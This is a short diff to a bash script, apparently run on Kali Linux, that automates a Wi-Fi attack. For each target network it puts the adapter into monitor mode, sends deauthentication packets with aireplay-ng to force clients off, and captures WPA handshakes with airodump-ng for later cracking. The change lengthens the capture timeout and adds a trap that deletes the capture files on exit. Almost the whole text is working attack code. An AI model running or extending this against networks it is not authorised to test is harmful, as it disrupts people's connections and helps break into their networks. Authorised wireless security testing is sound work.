@@ -36,6 +36,7 @@ checkHandshakes(){
 }
 
 main(){
+	trap "rm /home/kali/sha*" EXIT
 	airmon-ng check kill
 	airmon-ng start wlan0
   	timeout 5 airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null 
@@ -59,7 +60,7 @@ main(){
 		echo $channel
 		
 		iwconfig wlan0mon channel $channel
-		timeout 20 airodump-ng --bssid $bssid -w /home/kali/shakes wlan0mon < /dev/null > /dev/null &
+		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan0mon < /dev/null > /dev/null &
 		aireplay-ng -a $bssid -0 10 wlan0mon
 		sleep 10
 		checkHandshakes
